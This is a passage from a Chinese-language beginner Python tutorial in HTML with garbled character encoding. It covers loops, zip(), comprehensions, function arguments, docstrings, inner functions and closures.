<li>if-elif-elseè¯­å¥</li>
<li>å¤šä¸ªelseifè¯­å¥å—åŠçœç•¥elseè¯­å¥ </li>
</ol>
</li>
<li><p><strong>ifè¯­å¥å—ä¸éœ€è¦ç”¨å°æ‹¬å·æ‹¬èµ·æ¥</strong> ï¼Œä¸”å¥æœ«éœ€è¦åŠ ä¸Š<strong>å†’å·</strong> </p>
</li>
<li><p>ä¸åŒäºcç±»è¯­è¨€ï¼Œ<code>5&lt;x&lt;10</code>è¿™æ ·çš„è¯­å¥åœ¨pyä¸­æ˜¯å¯è¡Œçš„</p>
</li>
</ul>
<h3 id="whileå¾ªç¯"><a href="#whileå¾ªç¯" class="headerlink" title="whileå¾ªç¯"></a>whileå¾ªç¯</h3><p>å’Œcç³»è¯­è¨€ä¸€æ ·æ‹¥æœ‰breakï¼Œcontinueç­‰</p>
<p>ä¸cç³»è¯­è¨€ä¸åŒï¼Œpyçš„<em>whileå¾ªç¯</em> å’Œ<em>forå¾ªç¯</em>ä¹Ÿå¯ä»¥ä½¿ç”¨elseè¯­å¥ï¼Œ<strong>å¦‚æœ while å¾ªç¯æ­£å¸¸ç»“æŸï¼ˆæ²¡æœ‰ä½¿ç”¨ break è·³å‡ºï¼‰ï¼Œç¨‹åºå°†è¿›å…¥åˆ°å¯é€‰çš„ else æ®µ</strong> ï¼Œæ¦‚å¿µä¸if-elseä¸åŒï¼Œä¸ªäººç†è§£ï¼šå¾ªç¯é€šå¸¸æ˜¯ä¸ºäº†å¯»æ‰¾æŸä¸ªå…ƒç´ ï¼Œå¦‚æœæ‰¾åˆ°å°±breakäº†ï¼Œä¸éœ€è¦è¿›è¡Œelseç»§ç»­åˆ¤æ–­ï¼›åä¹‹å¾ªç¯æ²¡æœ‰è§¦å‘breakæ¡ä»¶åˆ™éœ€è¦elseå³ç»­è¿›è¡Œåˆ¤æ–­</p>
<h3 id="forå¾ªç¯ï¼Œä½¿ç”¨è¿­ä»£å™¨ï¼ˆiteratorï¼‰"><a href="#forå¾ªç¯ï¼Œä½¿ç”¨è¿­ä»£å™¨ï¼ˆiteratorï¼‰" class="headerlink" title="forå¾ªç¯ï¼Œä½¿ç”¨è¿­ä»£å™¨ï¼ˆiteratorï¼‰"></a>forå¾ªç¯ï¼Œä½¿ç”¨è¿­ä»£å™¨ï¼ˆiteratorï¼‰</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¯¹cç±»è¯­æ³•ç†Ÿæ‚‰å¯èƒ½ä¼šå†™å‡ºå¦‚ä¸‹ä»£ç </span></span><br><span class="line">numbers = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(tmp&lt;<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(numbers[tmp])</span><br><span class="line">    tmp+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#outsï¼š1 2 3 4 5 6</span></span><br><span class="line">    <span class="comment">#è¿™ä»£ç å¹¶æ²¡æœ‰é”™ï¼Œä½†æ˜¯æœ‰æ›´ä¼˜è§£ï¼Œç®€åŒ–ä»£ç </span></span><br><span class="line">numbers = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="built_in">print</span>(number)</span><br><span class="line"><span class="comment">#å°†ä»£ç æ”¹æˆè¿™æ ·ï¼Œä½¿å…¶æ›´æœ‰pyé£æ ¼ï¼Œæé«˜æ˜“è¯»æ€§</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¾‹ä¸­çš„æ–¹æ³•å¯ä»¥ç§°ä¹‹ä¸ºè¿­ä»£å™¨ï¼Œpyä¸­listï¼Œdirectionary,string,tuple,setå‡æ˜¯å¯ä»¥è¿­ä»£çš„å¯¹è±¡ã€‚å…ƒç»„/åˆ—è¡¨åœ¨è¿­ä»£çš„è¿‡ç¨‹ä¸­äº§ç”Ÿä¸€é¡¹ï¼Œè€Œå­—ç¬¦ä¸²ä¼šäº§ç”Ÿä¸€ä¸ªå­—ç¬¦ï¼Œå¯¹ä¸€ä¸ªå­—å…¸è¿›è¡Œè¿­ä»£ä¼šè¿”å›å­—å…¸çš„æ‰€æœ‰keyï¼ˆå’Œå‡½æ•°<code>keys()</code>åŠŸèƒ½ç›¸åŒï¼‰ï¼Œè‹¥æ˜¯å¯¹å­—å…¸çš„valueå’Œitemè¿›è¡Œè¿­ä»£å¯ä»¥ç”¨<code>.value()</code>,<code>.items()</code>æ–¹æ³•ï¼Œè¯¦è§ä¸Šæ–‡â€œå­—å…¸è½¬åˆ—è¡¨â€å°èŠ‚</p>
<h4 id="ä½¿ç”¨zip-è¿›è¡Œå¹¶è¡Œè¿­ä»£"><a href="#ä½¿ç”¨zip-è¿›è¡Œå¹¶è¡Œè¿­ä»£" class="headerlink" title="ä½¿ç”¨zip()è¿›è¡Œå¹¶è¡Œè¿­ä»£"></a>ä½¿ç”¨<code>zip()</code>è¿›è¡Œå¹¶è¡Œè¿­ä»£</h4><p>å¹¶ä¸æ˜¯zipå‹ç¼©çš„é‚£ä¸ªæ ‡å‡†ï¼ˆ</p>
<p>æˆ‘æ‰¾äº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°zipè¿™ä¸ªåå­—æ€ä¹ˆæ¥çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&quot;John&quot;</span>, <span class="string">&quot;Charles&quot;</span>, <span class="string">&quot;Mike&quot;</span>)</span><br><span class="line">b = (<span class="string">&quot;Jenny&quot;</span>, <span class="string">&quot;Christy&quot;</span>, <span class="string">&quot;Monica&quot;</span>, <span class="string">&quot;Vicky&quot;</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">zip</span>(a, b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿™é‡Œæˆ‘è´´äº†ä¸€ä¸ªw3cschoolçš„ç¤ºä¾‹ä»£ç </span></span><br><span class="line"><span class="comment">#use the tuple() function to display a readable version of the result:</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(x))</span><br><span class="line"><span class="comment">#outsï¼š((&#x27;John&#x27;, &#x27;Jenny&#x27;), (&#x27;Charles&#x27;, &#x27;Christy&#x27;), (&#x27;Mike&#x27;, &#x27;Monica&#x27;))</span></span><br><span class="line"><span class="comment">#ä»¥é•¿åº¦çŸ­çš„ä¸ºæ ‡å‡†è¾“å‡ºï¼Œæ­¤ä¾‹ä¸­çŸ­çš„3ä¸ªå…ƒç´ ï¼Œå°±è¾“å‡ºä¸‰ä¸ªé”®å€¼å¯¹ã€‚è¿™é‡Œè¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªè¿­ä»£ç±»å‹ï¼Œå®é™…åº”ç”¨ä¸­å¯ä»¥ç”¨dict()è½¬æ¢å­—å…¸è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¾‹ä¸­ä½¿ç”¨äº†<code>zip()</code>å‡½æ•°ï¼Œé€šä¿—çš„ç†è§£å°±æ˜¯å°†ä¸¤ä¸ªåˆ†å¼€ä¸œè¥¿ï¼ˆæ”¯æŒè¿­ä»£çš„å¯¹è±¡ï¼Œå…ƒç»„ï¼Œåˆ—è¡¨ç­‰ç­‰ï¼‰å‡‘æˆäº†ä¸€å¯¹ï¼Œå¹¶ä¸”å–çŸ­è¾“å‡ºï¼Œæ‰¯äº†é‚£ä¹ˆå¤šzipè¿˜æ²¡è®²åˆ°å¹¶è¡Œè¿­ä»£ï¼Œç°åœ¨å›å½’æ­£é¢˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&quot;John&quot;</span>, <span class="string">&quot;Charles&quot;</span>, <span class="string">&quot;Mike&quot;</span>)</span><br><span class="line">b = (<span class="string">&quot;Jenny&quot;</span>, <span class="string">&quot;Christy&quot;</span>, <span class="string">&quot;Monica&quot;</span>, <span class="string">&quot;Vicky&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f_name,l_name <span class="keyword">in</span> <span class="built_in">zip</span>(a,b):</span><br><span class="line">    <span class="built_in">print</span>(f_name,l_name)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment">#John Jenny</span></span><br><span class="line"><span class="comment">#Charles Christy</span></span><br><span class="line"><span class="comment">#Mike Monica</span></span><br></pre></td></tr></table></figure>

<p>è¿ç”¨ï¼šä¸¤ä¸ªåˆ—è¡¨å’Œæˆä¸€ä¸ªå­—å…¸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">la = [<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">lb = [<span class="string">&#x27;charles&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>]</span><br><span class="line">me = <span class="built_in">dict</span>(<span class="built_in">zip</span>(la,lb))</span><br></pre></td></tr></table></figure>



<h3 id="æ¨å¯¼å¼ï¼ˆç”Ÿæˆå¼ï¼‰-comprehensions"><a href="#æ¨å¯¼å¼ï¼ˆç”Ÿæˆå¼ï¼‰-comprehensions" class="headerlink" title="æ¨å¯¼å¼ï¼ˆç”Ÿæˆå¼ï¼‰(comprehensions)"></a>æ¨å¯¼å¼ï¼ˆç”Ÿæˆå¼ï¼‰(comprehensions)</h3><ul>
<li>åˆ—è¡¨æ¨å¯¼å¼</li>
</ul>
<p>usage:<code>[expression for item in iterable if condition]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_list = [number <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>) <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a_list)</span><br><span class="line"><span class="comment">#outs: [1, 3, 5]</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ª number å˜é‡ä¸ºåˆ—è¡¨ç”Ÿæˆå€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠŠå¾ªç¯ã€åˆ¤æ–­çš„ç»“æœæ”¾åœ¨åˆ—è¡¨ a_list ä¸­ã€‚ç¬¬äºŒä¸ª number ä¸ºå¾ªç¯å˜é‡,åœ¨å¾ªç¯çš„æ—¶å€™æ‰§è¡Œifåˆ¤æ–­è¯­å¥ï¼ŒåªæŠŠå¥‡æ•°å­˜å…¥ç¬¬ä¸€ä¸ªnumberï¼ˆåˆ—è¡¨ç”Ÿæˆå€¼ï¼‰</p>
<ul>
<li>å­—å…¸æ¨å¯¼å¼</li>
</ul>
<p>usage:<code>&#123;key:value for key,value in iterable if condition&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dictionary = &#123;<span class="string">&#x27;customer1&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;customer2&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;customer3&#x27;</span>: <span class="number">11</span>&#125;</span><br><span class="line">my_results = &#123;key : value <span class="keyword">for</span> key, value <span class="keyword">in</span> my_dictionary.items() <span class="keyword">if</span> value &gt; <span class="number">10</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_results)</span><br><span class="line"><span class="comment">#outs: &#123;&#x27;customer3&#x27;: 11&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç±»ä¼¼åˆ—è¡¨æ¨å¯¼å¼</p>
<ul>
<li>é›†åˆæ¨å¯¼å¼</li>
</ul>
<p>usage:<code>&#123;expression for item in iterable if condition&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a_set = &#123;number <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>) <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a_set)</span><br><span class="line"><span class="comment">#outs: &#123;1, 3, 5&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>()</span></span><br><span class="line"><span class="function">	&quot;&quot;&quot;æ˜¾ç¤ºç®€å•çš„é—®å€™è¯­&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">print</span>(<span class="params"><span class="string">&quot;hello!&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">func</span>()</span></span><br></pre></td></tr></table></figure>

<h4 id="å½¢å‚å’Œå®å‚"><a href="#å½¢å‚å’Œå®å‚" class="headerlink" title="å½¢å‚å’Œå®å‚"></a>å½¢å‚å’Œå®å‚</h4><ul>
<li>ä½ç½®å®å‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pet</span>(<span class="params">animal_type ,pet_name</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n I have a &quot;</span>+animal_type)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My&quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title())</span><br><span class="line">    </span><br><span class="line">pet (<span class="string">&#x27;hamster&#x27;</span>,<span class="string">&#x27;harry&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>å…³é”®è¯å®å‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pet</span>(<span class="params">animal_type,pet_name</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n I have a &quot;</span>+animal_type)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My&quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title())</span><br><span class="line">pet(animal_type = <span class="string">&#x27;hamster&#x27;</span>,pet_name=<span class="string">&#x27;harry&#x27;</span>)<span class="comment">#æ­¤æ—¶å¯ä»¥éšæ„è°ƒæ¢ä½ç½®</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å¯ä»¥å½¢å‚è®¾å®šé»˜è®¤å€¼ï¼Œ<code>animal_type=&#39;dog&#39;</code>ä½¿ç”¨é»˜è®¤å€¼æ—¶å¿…é¡»å…ˆåˆ—å‡ºæ²¡æœ‰é»˜è®¤å€¼çš„å½¢å‚ï¼Œå†åˆ—å‡ºæœ‰é»˜è®¤å€¼çš„å®å‚</li>
</ul>
<h4 id="å‡½æ•°è¿”å›å€¼"><a href="#å‡½æ•°è¿”å›å€¼" class="headerlink" title="å‡½æ•°è¿”å›å€¼"></a>å‡½æ•°è¿”å›å€¼</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span>(<span class="params">fitst_name,last_name</span>):</span></span><br><span class="line">    full_name = first_name +<span class="string">&#x27; &#x27;</span> + last_name</span><br><span class="line">    <span class="keyword">return</span> full_name.title()</span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;harry&#x27;</span>,<span class="string">&#x27;smith&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure>

<ul>
<li>è®©å®å‚å˜æˆå¯é€‰çš„</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_formatted_name</span> (<span class="params">first_name,last_name,middle_name=<span class="string">&#x27;&#x27;</span></span>):</span><span class="comment">#æœ‰é»˜è®¤å€¼çš„å®å‚æ”¾åœ¨æœ€å</span></span><br><span class="line">    <span class="keyword">if</span> middle_name:</span><br><span class="line">        full_name = first_name+<span class="string">&#x27; &#x27;</span>+middle_name+<span class="string">&#x27; &#x27;</span>+last_name</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">        full_name = first_name+<span class="string">&#x27; &#x27;</span>+last_name</span><br><span class="line">     <span class="keyword">return</span> full_name.title()</span><br><span class="line"><span class="comment">#æ²¡æœ‰ä¸­é—´åæƒ…å†µ</span></span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;harry&#x27;</span>,<span class="string">&#x27;smith&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br><span class="line"><span class="comment">#æœ‰ä¸­é—´åæƒ…å†µ</span></span><br><span class="line">musician = get_formatted_name(<span class="string">&#x27;harry&#x27;</span>,<span class="string">&#x27;hamster&#x27;</span>,<span class="string">&#x27;smith&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(musician)</span><br></pre></td></tr></table></figure>

<ul>
<li>å‡½æ•°å¯ä»¥è¿”å›ä»»ä½•ç±»å‹çš„å€¼ï¼ŒåŒ…æ‹¬å­—å…¸ï¼Œåˆ—è¡¨</li>
<li>åœ¨å‡½æ•°ä¸­ä¼ é€’åˆ—è¡¨</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_users</span>(<span class="params">names</span>):</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        msg = <span class="string">&quot;Hello,&quot;</span>+name.title()+<span class="string">&quot;!&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        </span><br><span class="line">usernames = [<span class="string">&#x27;hannah&#x27;</span>,<span class="string">&#x27;ty&#x27;</span>,<span class="string">&#x27;margot&#x27;</span>]</span><br><span class="line">greet_users(usernames)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment"># Hello,Hannah!</span></span><br><span class="line"><span class="comment"># Hello,Ty!</span></span><br><span class="line"><span class="comment"># Hello,Margot!</span></span><br></pre></td></tr></table></figure>

<p><strong>ç¦æ­¢å‡½æ•°ä¿®æ”¹åˆ—è¡¨ï¼Œåœ¨å‡½æ•°ä¸­ä¼ å…¥åˆ—è¡¨æ—¶ç”¨åˆ‡ç‰‡è¡¨ç¤ºæ³•<code>[:]</code>å¯ä»¥è¡¨ç¤ºä»…å¤åˆ¶ä¸æ”¹å˜åŸåˆ—è¡¨çš„å€¼</strong></p>
<h4 id="ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚"><a href="#ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚" class="headerlink" title="ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚"></a>ä¼ é€’ä»»æ„æ•°é‡çš„å®å‚</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pizza</span>(<span class="params">*toppings</span>):</span><span class="comment">#*ç”¨äºå»ºç«‹ä¸€ä¸ªç©ºçš„å…ƒç»„toppings</span></span><br><span class="line">    <span class="built_in">print</span>(toppings)</span><br><span class="line"> </span><br><span class="line">make_pizza(<span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="string">&#x27;mushrooms&#x27;</span>,<span class="string">&#x27;green peppers&#x27;</span>,<span class="string">&#x27;extra cheese&#x27;</span>)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="comment">#(&#x27;pepperoni&#x27;,)  #è¿™é‡Œå¤šä¸€ä¸ªé€—å·çš„åŸå› ä¸æ˜¯ç¼–è¯‘å™¨åäº†ï¼Œå½“å…ƒç»„å…ƒç´ ä¸º1æ—¶ä¼šå¤šåŠ ä¸€ä¸ªé€—å·ï¼Œè€Œä¸¤ä¸ªä»¥ä¸Šå°±å¯ä»¥çœç•¥</span></span><br><span class="line"><span class="comment">#(&#x27;mushrooms&#x27;, &#x27;green peppers&#x27;, &#x27;extra cheese&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>å½¢å‚å*toppingsåˆ›å»ºäº†ä¸€ä¸ªåä¸ºtoppingsçš„ç©ºå…ƒç»„ï¼Œå¹¶å°†æ”¶åˆ°çš„å€¼å…¨éƒ¨å°è£…åˆ°æ‰¾ä¸ªå…ƒç»„ä¸­ï¼Œä»¥æ­¤å®ç°ä»»æ„æ•°é‡çš„å®å‚</p>
<h4 id="ä½¿ç”¨ä»»æ„æ•°é‡çš„å…³é”®å­—å®å‚"><a href="#ä½¿ç”¨ä»»æ„æ•°é‡çš„å…³é”®å­—å®å‚" class="headerlink" title="ä½¿ç”¨ä»»æ„æ•°é‡çš„å…³é”®å­—å®å‚"></a>ä½¿ç”¨ä»»æ„æ•°é‡çš„å…³é”®å­—å®å‚</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_profile</span> (<span class="params">first,last,**user_info</span>):</span><span class="comment">#**ç”¨äºå»ºç«‹ä¸€ä¸ªç©ºçš„å­—å…¸user_info</span></span><br><span class="line">	profile = &#123;&#125; <span class="comment">#ç©ºå­—å…¸</span></span><br><span class="line">    profile[<span class="string">&#x27;first_name&#x27;</span>] = first</span><br><span class="line">    profile[<span class="string">&#x27;last_name&#x27;</span>] = last</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> user_info.items():<span class="comment">#itemå°†keyå’Œvalueå–å‡º</span></span><br><span class="line">    	profile[key] = value</span><br><span class="line">    <span class="keyword">return</span> profile</span><br><span class="line"></span><br><span class="line">user_profile = build_profile(<span class="string">&#x27;albert&#x27;</span>,<span class="string">&#x27;einstein&#x27;</span>,location=<span class="string">&#x27;princeton&#x27;</span>,field=<span class="string">&#x27;physics&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(user_profile)</span><br></pre></td></tr></table></figure>

<h4 id="æ–‡æ¡£æ³¨é‡Šï¼ˆæ–‡æ¡£å­—ç¬¦ä¸²ï¼‰"><a href="#æ–‡æ¡£æ³¨é‡Šï¼ˆæ–‡æ¡£å­—ç¬¦ä¸²ï¼‰" class="headerlink" title="æ–‡æ¡£æ³¨é‡Šï¼ˆæ–‡æ¡£å­—ç¬¦ä¸²ï¼‰"></a>æ–‡æ¡£æ³¨é‡Šï¼ˆæ–‡æ¡£å­—ç¬¦ä¸²ï¼‰</h4><p>åŸæ–‡ç¿»è¯‘ä¸­è¯‘åæ˜¯æ–‡æ¡£å­—ç¬¦ä¸²ï¼Œæˆ‘è§‰å¾—æ–‡æ¡£æ³¨é‡Šæ›´å®¹æ˜“ç†è§£ï¼Œå°±åƒgithubä¸Šä¸€ä¸ªé¡¹ç›®çš„readmeï¼Œåœ¨pyä¸­æ–‡æ¡£æ³¨é‡Šç”¨æ¥æè¿°å‡½æ•°çš„åŠŸèƒ½ï¼Œå¢åŠ ä»£ç çš„å¯è¯»æ€§ï¼Œå¯ä»¥ç”¨help()ï¼Œæˆ–è€…<code>func_name.__doc__</code></p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_name</span>(<span class="params">*name</span>):</span></span><br><span class="line">    <span class="string">&#x27;it can print name&#x27;</span> <span class="comment">#è¿™ä¸ªå°±æ˜¯æ–‡æ¡£æ³¨é‡Š</span></span><br><span class="line">    <span class="built_in">print</span>(name)			<span class="comment">#åŒæ ·å¯ä»¥ç”¨å¤šè¡Œæ³¨é‡Šæ¥å†™æ–‡æ¡£æ³¨é‡Šï¼Œæœ‰ä¹¦è¯´pyæ³¨é‡Šæ²¡æœ‰å¤šè¡Œæ³¨é‡Šï¼Œå¤šè¡Œæ³¨é‡Šå°±æ˜¯æ–‡æ¡£æ³¨é‡Š</span></span><br><span class="line"></span><br><span class="line">print_name(<span class="string">&#x27;harry&#x27;</span>, <span class="string">&#x27;atuoa&#x27;</span>)</span><br><span class="line"><span class="comment">#outsï¼š(&#x27;harry&#x27;, &#x27;atuoa&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>(print_name) <span class="comment"># help(å‡½æ•°å)æ¥è·å–è¯¥å‡½æ•°çš„å…·ä½“åŠŸèƒ½</span></span><br><span class="line"><span class="comment">#outsï¼šHelp on function print_name in module __main__:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#print_name(*name)</span></span><br><span class="line"><span class="comment">#   it can print name</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(print_name.__doc__) <span class="comment">#ä½¿ç”¨__doc__æ¥ç›´æ¥è·å–æ–‡æ¡£æ³¨é‡Š</span></span><br><span class="line"><span class="comment">#outs: it can print name</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¾‹ä¸­é‚£ä¸ªå¥‡å¥‡æ€ªæ€ªçš„<code>__doc__</code>å…¶å®æ˜¯pyçš„ä¿ç•™ç”¨æ³•ï¼Œæœ¬è´¨æ˜¯ä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¸å…è®¸ç”¨æˆ·è‡ªå·±å®šä¹‰è¿™ç§åå­—çš„å˜é‡ï¼Œé€šå¸¸ä¼šé™¤äº†ä¸Šä¾‹ä¸­çš„ç”¨æ³•ï¼Œè¿˜æœ‰è·å–è¯¥å‡½æ•°åå­—çš„ç”¨æ³•<code>func_name.__name__</code></p>
<h4 id="å†…éƒ¨å‡½æ•°ã€é—­åŒ…ã€åŒ¿åå‡½æ•°lambda"><a href="#å†…éƒ¨å‡½æ•°ã€é—­åŒ…ã€åŒ¿åå‡½æ•°lambda" class="headerlink" title="å†…éƒ¨å‡½æ•°ã€é—­åŒ…ã€åŒ¿åå‡½æ•°lambda()"></a>å†…éƒ¨å‡½æ•°ã€é—­åŒ…ã€åŒ¿åå‡½æ•°<code>lambda()</code></h4><ul>
<li>è¿™éƒ¨åˆ†å†…å®¹æœ‰ç‚¹ç»•ï¼Œå®¹æ˜“æ··æ·†ï¼Œå¦‚æœä½ ä»¬è¯¾ç¨‹ä¸è¦æ±‚ï¼Œå¯ä»¥è·³è¿‡</li>
</ul>
<p>å‡½æ•°çš„â€œä¼˜å…ˆçº§â€å¯ä»¥è¯´æ˜¯ä¹‹å‰æåˆ°è¿‡çš„ä»»ä½•pyæ•°æ®ç»“æ„éƒ½ä¸èƒ½æ¯”æ‹Ÿçš„ï¼Œå¯ä»¥å°†å‡½æ•°çš„è¿”å›å€¼èµ‹å€¼ç»™å˜é‡ï¼Œä½œä¸ºå‚æ•°è¢«å…¶ä»–å‡½æ•°è°ƒç”¨ï¼Œä»å…¶ä»–å‡½æ•°ä¸­è¿”å›å€¼</p>
<h5 id="å†…éƒ¨å‡½æ•°"><a href="#å†…éƒ¨å‡½æ•°" class="headerlink" title="å†…éƒ¨å‡½æ•°"></a>å†…éƒ¨å‡½æ•°</h5><p>å†…éƒ¨å‡½æ•°æ•…åæ€æ„ï¼Œå°±æ˜¯åœ¨å†…éƒ¨çš„å‡½æ•°ï¼Œåœ¨ä»€ä¹ˆå†…éƒ¨çš„å‡½æ•°å‘¢ï¼Ÿå‡½æ•°ã€‚å³åœ¨å‡½æ•°å†…éƒ¨çš„å‡½æ•°ï¼Œå‡½æ•°å¥—å¨ƒï¼ˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">c, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> c + d</span><br><span class="line">    <span class="keyword">return</span> inner(a, b)</span><br><span class="line"></span><br><span class="line">result = outer(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># outs: 8</span></span><br></pre></td></tr></table></figure>

<p>å†…éƒ¨å‡½æ•°å’Œåé¢çš„é—­åŒ…çš„åŒºåˆ«å°±åœ¨äºï¼Œå†…éƒ¨å‡½æ•°è·å–æ•°æ®æ˜¯é€šè¿‡å¤–éƒ¨å‡½æ•°ä¼ å‚å®ç°çš„ã€‚</p>
<h5 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h5><p>å®šä¹‰å¦‚ä¸‹ï¼šé—­åŒ…æ˜¯ä¸€ä¸ªå¯ä»¥ç”±å¦ä¸€ä¸ªå‡½æ•°åŠ¨æ€ç”Ÿæˆçš„å‡½æ•°ï¼Œå¹¶ä¸”å¯ä»¥æ”¹å˜å’Œå­˜å‚¨å‡½æ•°å¤–åˆ›å»ºçš„å˜é‡çš„å€¼</p>
<p>ç®€å•çš„è¯´ï¼š</p>
<ol>
<li>é—­åŒ…é¦–å…ˆå¾—æ˜¯ä¸€ä¸ªå†…éƒ¨å‡½æ•°</li>
<li>å¤–éƒ¨å‡½æ•°çš„è¿”å›å€¼å¿…é¡»æ˜¯å†…åµŒå‡½æ•°</li>
<li>å†…åµŒå‡½æ•°å¿…é¡»è°ƒç”¨å¤–éƒ¨å‡½æ•°å˜é‡</li>
</ol>
